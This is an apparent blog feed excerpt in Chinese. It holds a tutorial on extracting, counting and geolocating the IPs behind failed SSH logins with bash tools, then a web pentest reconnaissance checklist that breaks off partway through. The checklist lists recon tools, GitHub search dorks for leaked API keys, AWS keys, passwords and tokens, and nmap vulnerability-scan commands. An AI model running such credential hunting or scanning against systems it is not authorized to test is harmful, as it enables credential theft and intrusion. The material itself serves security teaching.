&quot;root&quot;</span><br><span class="line">Aug 23 05:08:10 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:11 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</span><br><span class="line">Aug 23 05:08:13 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:14 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</span><br><span class="line">Aug 23 05:08:16 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:16 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</span><br><span class="line">Aug 23 05:08:18 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:19 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</span><br><span class="line">Aug 23 05:08:21 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:22 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</span><br><span class="line">Aug 23 05:08:24 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:24 centos7 sshd[5185]: Disconnecting: Too many authentication failures for root [preauth]</span><br></pre></td></tr></table></figure></p><p>再次，找出不同用户连接出现一次的记录，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 05:08:09 centos7 sshd[5185]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br></pre></td></tr></table></figure></p><blockquote><p>使用grep进行过滤。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;pam_unix(sshd:auth): authentication failure&quot; secure</span><br></pre></td></tr></table></figure><blockquote><p>产生以下输出：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 05:04:56 centos7 sshd[5153]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br><span class="line">Aug 23 05:05:18 centos7 sshd[5160]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br><span class="line">Aug 23 05:05:42 centos7 sshd[5164]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br><span class="line">Aug 23 05:06:06 centos7 sshd[5168]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br><span class="line">etc</span><br></pre></td></tr></table></figure><p>这正是我们需要的输出，我们可以在以上的输出情况下，过滤出ip地址。</p><p>2）、从一行文本中提取文本字符串</p><p>工具：cut、awk</p><p>awk是一个非常复杂的命令，但大多数管理员只能按以下方式来使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;&#123;print $N&#125;&apos;</span><br></pre></td></tr></table></figure><p>其中$N是从左到右空格所分割字符串的数量，在我们的日志行中，ip地址是文本字符串编号的10，awk命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;&#123;print $10&#125;&apos;</span><br></pre></td></tr></table></figure><p>首先使用grep进行文本过滤，通过管道符”|”，执行awk命令过滤出ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo “Aug 23 03:53:58 centos7 sshd[5501]: Invalid user agent from 193.201.224.218” | awk ‘&#123;print $10&#125;’</span><br><span class="line">193.201.224.218</span><br></pre></td></tr></table></figure><p>可以看到，成功的提取出了ip地址，接下来进行文本过滤操作，将输出直接保存到文本文件中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Invalid user&quot; secure | awk &apos;&#123;print $10&#125;&apos; &gt;IPs.txt</span><br></pre></td></tr></table></figure><p>接下来对有效用户进行同样的操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 05:08:33 centos7 sshd[5187]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br></pre></td></tr></table></figure><p>接下来，将rhost中的218.65.30.123分离出来，这时我们就需要使用<code>cut</code>命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut -d &quot;=&quot; -f 2</span><br></pre></td></tr></table></figure><p>整个语句合并起来就是如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Aug 23 05:08:33 centos7 sshd[5187]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root&quot; | awk &apos;&#123;print $14&#125;&apos; | cut -d&quot;=&quot; -f2</span><br><span class="line">218.65.30.123</span><br></pre></td></tr></table></figure><p>上述命令可以提取出ip地址，现在我们将所有输出保存到文本文件当中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &apos;pam_unix(sshd:auth): authentication failure;&apos; secure | awk &apos;&#123;print $14&#125;&apos; | cut -d&quot;=&quot; -f2 &gt;&gt;IPs.txt</span><br></pre></td></tr></table></figure><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>我们现在有一个ip地址文件，其中包含了登录失败的ip地址。在第2部分将介绍如何对这些IP地址进行排序和计数，以便我们可以了解他们尝试登录的次数，并按照尝试的次数排列它们。</p><hr><h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a><strong>第二部分</strong></h1><h1 id="008-第二部分-从linux服务器的日志中提取信息"><a href="#008-第二部分-从linux服务器的日志中提取信息" class="headerlink" title="008-第二部分-从linux服务器的日志中提取信息"></a>008-第二部分-从linux服务器的日志中提取信息</h1><blockquote><p>在本系列的第一部分中，我们从/var/log/secure日志文件中提取了未经授权的SSH连接的IP地址。从中我们导出了一个ip地址列表，其中，每个ip代表登录尝试失败的ip。</p></blockquote><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><blockquote><p>统计未经授权的SSH登录尝试失败/成功的次数。</p></blockquote><p>第二部分 目标</p><p>在这部分，主要使用bash工具<code>sort</code>、<code>uniq</code>等工具对其中的ip地址进行排序。</p><h2 id="第一部分-排序ip"><a href="#第一部分-排序ip" class="headerlink" title="第一部分 排序ip"></a>第一部分 排序ip</h2><blockquote><p>sort</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cat IPs.txt | sort</span><br><span class="line"></span><br><span class="line"># sort将按照字母顺序排序</span><br></pre></td></tr></table></figure><h2 id="计算相同ip的次数"><a href="#计算相同ip的次数" class="headerlink" title="计算相同ip的次数"></a>计算相同ip的次数</h2><blockquote><p>uniq</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat IPs.txt | sort | uniq -c</span><br></pre></td></tr></table></figure><h2 id="ip排名"><a href="#ip排名" class="headerlink" title="ip排名"></a>ip排名</h2><p>最后一步是按照日志文件中尝试ip的次数进行排序，再次使用<code>sort</code>命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## sort -n:正向排序</span><br><span class="line">## sort -r:反向排序</span><br><span class="line"></span><br><span class="line">cat IPs.txt | sort | uniq -c | sort -n</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-27_21-35-21.png" alt="1"></p><h2 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h2><p>你现在可以通过这些命令对所有的文件输出进行筛选。</p><p>在第三部分，我们将创建一个<code>for</code>循环来遍历排名的ip，并使用<code>whois</code>对每个ip进行查找，已找出他们来自那个国家。</p><hr><h1 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a><strong>第三部分</strong></h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>在本系列的第一部分和第二部分中，我们提取了未经授权的SSH登录尝试的ip地址，然后对其进行排序。现在我们已经得到了一个排列后的ip地址列表，我们需要找出这些ip地址来自那个国家。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>通过<code>for</code>循环来遍历排列后的ip地址，利用<code>whois</code>对每个ip进行whois查询，找出这些ip来自哪些国家。</p><h2 id="for循环？"><a href="#for循环？" class="headerlink" title="for循环？"></a>for循环？</h2><blockquote><p>for循环是执行重复操作的一种方式。一些bash工具，如grep和awk可以接受前一个命令的输出。但是，其他命令，如whois不接受标准输入。必须运行他们提供的字符串。如ip地址或域名作为选项，这意味着我们必须为每个ip重复运行正确的结构化命令。为此，我们需要使用到for循环。</p></blockquote><blockquote><p>for巡检的结构如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in x;do</span><br><span class="line">      command i</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>其中x是输入，如ip地址列表，i是一个变量，从ip地址列表中获取的一行，每次循环，i都会变。</p><p>也可以这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in X; do command $i; done</span><br></pre></td></tr></table></figure><p>1)、生成有效的输入</p><p>我们的第一步就是构建一个for循环，生成可以迭代的输入，需要一个每行一个文本字符串的列表。</p><p>列表如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat sort-ips.txt</span></span><br><span class="line">      1 211.21.218.75</span><br><span class="line">      2 182.97.215.127</span><br><span class="line">      2 46.148.18.114</span><br><span class="line">      3 222.74.225.125</span><br><span class="line">      3 46.27.238.200</span><br><span class="line">      6 111.20.245.25</span><br><span class="line">      6 112.101.165.34</span><br><span class="line">      6 116.236.124.48</span><br><span class="line">      6 123.144.62.228</span><br><span class="line">      6 125.117.0.7</span><br><span class="line">      6 176.53.82.66</span><br><span class="line">      6 189.10.52.92</span><br><span class="line">      6 191.85.175.35</span><br><span class="line">      6 196.43.235.219</span><br><span class="line">      6 78.198.26.81</span><br><span class="line">      9 106.6.176.243</span><br></pre></td></tr></table></figure><blockquote><p>进一步过滤：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat sort-ips.txt | awk '&#123;print $2&#125;'</span></span><br><span class="line">211.21.218.75</span><br><span class="line">182.97.215.127</span><br><span class="line">46.148.18.114</span><br><span class="line">222.74.225.125</span><br><span class="line">46.27.238.200</span><br><span class="line">111.20.245.25</span><br><span class="line">112.101.165.34</span><br><span class="line">116.236.124.48</span><br><span class="line">123.144.62.228</span><br><span class="line">125.117.0.7</span><br><span class="line">176.53.82.66</span><br><span class="line">189.10.52.92</span><br><span class="line">191.85.175.35</span><br><span class="line">196.43.235.219</span><br><span class="line">78.198.26.81</span><br><span class="line">106.6.176.243</span><br></pre></td></tr></table></figure><h2 id="将命令插入到for循环中"><a href="#将命令插入到for循环中" class="headerlink" title="将命令插入到for循环中"></a>将命令插入到for循环中</h2><p>现在我们有了一个命令来产生我们需要的输入，我们可以使用这个代替我们的for循环中的X。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(cat sorted-IPs.txt | awk &apos;&#123;print $2&#125;&apos;); do command $i; done</span><br></pre></td></tr></table></figure><p>通过echo进行输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do echo $i;done</span></span><br><span class="line">211.21.218.75</span><br><span class="line">182.97.215.127</span><br><span class="line">46.148.18.114</span><br><span class="line">222.74.225.125</span><br><span class="line">46.27.238.200</span><br><span class="line">111.20.245.25</span><br><span class="line">112.101.165.34</span><br><span class="line">116.236.124.48</span><br><span class="line">123.144.62.228</span><br><span class="line">125.117.0.7</span><br><span class="line">176.53.82.66</span><br><span class="line">189.10.52.92</span><br><span class="line">191.85.175.35</span><br><span class="line">196.43.235.219</span><br><span class="line">78.198.26.81</span><br><span class="line">106.6.176.243</span><br></pre></td></tr></table></figure><blockquote><p>利用whois进行查询</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do echo whois $i;done</span></span><br><span class="line">whois 211.21.218.75</span><br><span class="line">whois 182.97.215.127</span><br><span class="line">whois 46.148.18.114</span><br><span class="line">whois 222.74.225.125</span><br><span class="line">whois 46.27.238.200</span><br><span class="line">whois 111.20.245.25</span><br><span class="line">whois 112.101.165.34</span><br><span class="line">whois 116.236.124.48</span><br><span class="line">whois 123.144.62.228</span><br><span class="line">whois 125.117.0.7</span><br><span class="line">whois 176.53.82.66</span><br><span class="line">whois 189.10.52.92</span><br><span class="line">whois 191.85.175.35</span><br><span class="line">whois 196.43.235.219</span><br><span class="line">whois 78.198.26.81</span><br><span class="line">whois 106.6.176.243</span><br></pre></td></tr></table></figure><blockquote><p>将echo删除，直接利用whois执行命令</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do whois $i;done</span></span><br></pre></td></tr></table></figure><p>上述命令会输出一系列的输出，在一系列的输出，有一行是country： XX，我们只需要过滤出country就可以。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do whois $i | grep -m1 country;done</span></span><br><span class="line">country:        TW</span><br><span class="line">country:        CN</span><br><span class="line">country:        UA</span><br><span class="line">country:        CN</span><br><span class="line">country:        ES</span><br><span class="line">country:        CN</span><br><span class="line">country:        CN</span><br><span class="line">country:        CN</span><br><span class="line">country:        CN</span><br><span class="line">country:        CN</span><br><span class="line">country:        TR</span><br><span class="line">country:     AR</span><br><span class="line">country:        NG</span><br><span class="line">country:        FR</span><br><span class="line">country:        CN</span><br></pre></td></tr></table></figure><blockquote><p>把<code>country:</code>删除，利用awk</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># for i in $(cat sort-ips.txt | awk &apos;&#123;print $2&#125;&apos;);do whois $i | grep -m1 country | awk &apos;&#123;print $2&#125;&apos;;done</span><br><span class="line">TW</span><br><span class="line">CN</span><br><span class="line">UA</span><br><span class="line">CN</span><br><span class="line">ES</span><br><span class="line">CN</span><br><span class="line">CN</span><br><span class="line">CN</span><br><span class="line">CN</span><br><span class="line">CN</span><br><span class="line">TR</span><br><span class="line">AR</span><br><span class="line">NG</span><br><span class="line">FR</span><br><span class="line">CN</span><br></pre></td></tr></table></figure><blockquote><p>将ip添加到上述输出</p></blockquote><p>第一种方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do echo $i;whois $i | grep -m1 country | awk '&#123;print $2&#125;';done</span></span><br><span class="line">211.21.218.75</span><br><span class="line">TW</span><br><span class="line">182.97.215.127</span><br><span class="line">CN</span><br><span class="line">46.148.18.114</span><br><span class="line">UA</span><br><span class="line">222.74.225.125</span><br><span class="line">CN</span><br><span class="line">46.27.238.200</span><br><span class="line">ES</span><br><span class="line">111.20.245.25</span><br><span class="line">CN</span><br><span class="line">112.101.165.34</span><br><span class="line">CN</span><br><span class="line">116.236.124.48</span><br><span class="line">CN</span><br><span class="line">123.144.62.228</span><br><span class="line">CN</span><br><span class="line">125.117.0.7</span><br><span class="line">CN</span><br><span class="line">176.53.82.66</span><br><span class="line">TR</span><br><span class="line">189.10.52.92</span><br><span class="line">191.85.175.35</span><br><span class="line">AR</span><br><span class="line">196.43.235.219</span><br><span class="line">NG</span><br><span class="line">78.198.26.81</span><br><span class="line">FR</span><br><span class="line">106.6.176.243</span><br><span class="line">CN</span><br></pre></td></tr></table></figure><p>第二种，利用echo进行输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># for i in $(cat sort-ips.txt | awk &apos;&#123;print $2&#125;&apos;);do echo &quot;$i $(whois $i | grep -m1 country | awk &apos;&#123;print $2&#125;&apos;)&quot;;done</span><br><span class="line">211.21.218.75 TW</span><br><span class="line">182.97.215.127 CN</span><br><span class="line">46.148.18.114 UA</span><br><span class="line">222.74.225.125 CN</span><br><span class="line">46.27.238.200 ES</span><br><span class="line">111.20.245.25 CN</span><br><span class="line">112.101.165.34 CN</span><br><span class="line">116.236.124.48 CN</span><br><span class="line">123.144.62.228 CN</span><br><span class="line">125.117.0.7 CN</span><br><span class="line">176.53.82.66 TR</span><br><span class="line">189.10.52.92</span><br><span class="line">191.85.175.35 AR</span><br><span class="line">196.43.235.219 NG</span><br><span class="line">78.198.26.81 FR</span><br><span class="line">106.6.176.243 CN</span><br></pre></td></tr></table></figure><blockquote><p>输出之后，利用<code>column</code>工具对输出进行格式化：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># for i in $(cat sort-ips.txt | awk &apos;&#123;print $2&#125;&apos;);do echo &quot;$i $(whois $i | grep -m1 country | awk &apos;&#123;print $2&#125;&apos;)&quot;;done | column -t</span><br><span class="line">211.21.218.75   TW</span><br><span class="line">182.97.215.127  CN</span><br><span class="line">46.148.18.114   UA</span><br><span class="line">222.74.225.125  CN</span><br><span class="line">46.27.238.200   ES</span><br><span class="line">111.20.245.25   CN</span><br><span class="line">112.101.165.34  CN</span><br><span class="line">116.236.124.48  CN</span><br><span class="line">123.144.62.228  CN</span><br><span class="line">125.117.0.7     CN</span><br><span class="line">176.53.82.66    TR</span><br><span class="line">189.10.52.92</span><br><span class="line">191.85.175.35   AR</span><br><span class="line">196.43.235.219  NG</span><br><span class="line">78.198.26.81    FR</span><br><span class="line">106.6.176.243   CN</span><br></pre></td></tr></table></figure><h2 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a>结论</h2><p>本系列的目标是引导您使用bash工具在命令行中提取和处理数据。我希望你注意到，我们尽可能使用相同的工具来得到我们需要的结果。熟悉这些工具后，您将能够快速处理数据，而无需离开命令行。</p><p>文章来自：<a href="https://bash-prompt.net/guides/using-logs-1/，总共有三部分，我写在一块了，有删改。这个工具可以写成一个bash脚本，通过传入文件的参数输出不一样的内容，有时间写下，不是很难。" target="_blank" rel="noopener">https://bash-prompt.net/guides/using-logs-1/，总共有三部分，我写在一块了，有删改。这个工具可以写成一个bash脚本，通过传入文件的参数输出不一样的内容，有时间写下，不是很难。</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/wallhaven-442708.jpg&quot; alt=&quot;enter description here&quot; title=&quot;wallhaven-442708&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="linux" scheme="http://airs-sec.com/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>web安全信息收集</title>
    <link href="http://airs-sec.com/2018/01/04/web%E5%AE%89%E5%85%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://airs-sec.com/2018/01/04/web安全信息收集/</id>
    <published>2018-01-04T03:12:39.000Z</published>
    <updated>2018-01-04T03:23:00.819Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web安全信息收集"><a href="#web安全信息收集" class="headerlink" title="web安全信息收集"></a>web安全信息收集</h1><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1515035737450.jpg" alt="web安全信息收集"></p><a id="more"></a><blockquote><p>当我们拿到一个网站，如何开始对目标安全测试？是不是一上来，就拿出wvs先跑一遍，大部分人，包括我也是，拿到一个网站的时候，直接上漏洞扫描器对网站进行扫描。而往往忽略了前期信息收集的重要性。</p></blockquote><blockquote><p>在渗透测试的流程中，第一步为信息收集，可见信息收集的重要性，前期的信息收集决定了后期渗透利用是否能继续下去的重要一步。所谓知己知彼，百战不殆。</p></blockquote><hr><ul><li><p>信息收集</p><ul><li>用户名</li><li>邮件地址<ul><li><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">theHarvester</a></li></ul></li><li><p>域名</p><ul><li><p>DNS</p><ul><li><a href="https://centralops.net/co/DomainDossier.aspx" target="_blank" rel="noopener">Domain Dossier</a>-可进行地址查询，域名记录，路由跟踪，服务扫描</li><li><a href="http://viewdns.info" target="_blank" rel="noopener">viewdns.info</a>-可查询真实ip，针对做了cdn加速</li><li><a href="http://whois.chinaz.com/?DomainName=target.com&amp;ws=" target="_blank" rel="noopener">站长之家</a></li><li><a href="https://whois.aizhan.com/target.com/" target="_blank" rel="noopener">爱站</a></li><li><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></li><li><a href="https://github.com/search?q=target.com+password&amp;type=Code&amp;utf8=%E2%9C%93" target="_blank" rel="noopener">github泄露</a></li><li><a href="https://www.t00ls.net/domain.html" target="_blank" rel="noopener">tools在线工具</a></li><li><a href="http://searchdns.netcraft.com/" target="_blank" rel="noopener">netcraft</a></li></ul></li><li><p>子域名</p><ul><li><a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain" target="_blank" rel="noopener">find-subdomains</a>  - 查找子域名  </li><li>工具<ul><li>Layer子域名挖掘机V3.0 链接：<a href="https://pan.baidu.com/s/1jI9vDcy" target="_blank" rel="noopener">https://pan.baidu.com/s/1jI9vDcy</a> 密码：rykz</li><li>Layer子域名挖掘机4.1 重构版 链接：<a href="https://pan.baidu.com/s/1kUJmPKF" target="_blank" rel="noopener">https://pan.baidu.com/s/1kUJmPKF</a> 密码：ly5r</li><li><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a></li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">微步</a>-微步也可以对子域名进行扫描</li></ul></li></ul></li></ul></li><li><p>ip地址</p><ul><li><a href="http://site.ip138.com" target="_blank" rel="noopener">site.ip138</a>-ip/域名查询</li><li><a href="http://www.sameip.org/" target="_blank" rel="noopener">sameip</a>-反向ip查找</li><li><a href="http://tool.chinaz.com/" target="_blank" rel="noopener">站长之家</a>-集成了很多功能，包括域名/ip，seo查询，网站信息查询</li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">微步</a>-主打在线威胁情报分析</li><li><a href="http://viewdns.info" target="_blank" rel="noopener">viewdns</a>-可查询真实ip，针对做了cdn加速</li><li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">在线C段查询</a></li><li><a href="http://www.hao7188.com/" target="_blank" rel="noopener">ip地址查询</a></li></ul></li><li><p>github信息收集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">“Hackme.tld” API_key</span><br><span class="line">“Hackme.tld” secret_key</span><br><span class="line">“Hackme.tld” aws_key</span><br><span class="line">“Hackme.tld” Password</span><br><span class="line">“Hackme.tld” FTP</span><br><span class="line">“Hackme.tld” login</span><br><span class="line">“Hackme.tld” github_token</span><br></pre></td></tr></table></figure><ul><li><a href="https://github.com/search?q=target.com+password&amp;type=Code&amp;utf8=%E2%9C%93" target="_blank" rel="noopener">github泄露</a></li><li><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">githack</a> - 针对github源码泄露漏洞</li></ul></li><li><p>端口服务</p><ul><li>利用nmap进行漏洞扫描,在扫描大段的地址时，可以采用过滤的方式将某些不需要的字符过滤，利用grep命令和cut命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    Nmap Full Web Vulnerable Scan</span><br><span class="line"></span><br><span class="line">    cd /usr/share/nmap/scripts/</span><br><span class="line">wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse target</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv 